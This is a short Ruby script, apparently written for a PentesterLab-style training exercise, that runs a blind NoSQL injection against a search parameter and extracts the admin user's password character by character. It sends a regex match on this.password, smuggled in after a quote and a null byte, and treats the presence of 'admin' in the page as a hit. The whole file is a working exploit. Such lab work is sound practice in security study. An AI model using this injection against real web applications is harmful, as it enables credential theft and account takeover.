require 'httparty'

#https://ptl-4762fd2c-dc9773c3.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^n/)%00

URL = "ptl-4762fd2c-dc9773c3.libcurl.so"

def check?(str)
	resp = HTTParty.get("https://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00")
	return resp.body =~ />admin</
end

puts check?("d").inspect
puts check?("aaa").inspect

CHARSET = ('a'..'z').to_a+('0'..'9').to_a+['-']
password = ""

while true
	CHARSET.each do |c|
		puts "Trying: #{c} for #{password}"
		test = password+c
		if check?("^#{test}.*$")
			password+=c
			puts password
			break
		end
	end
end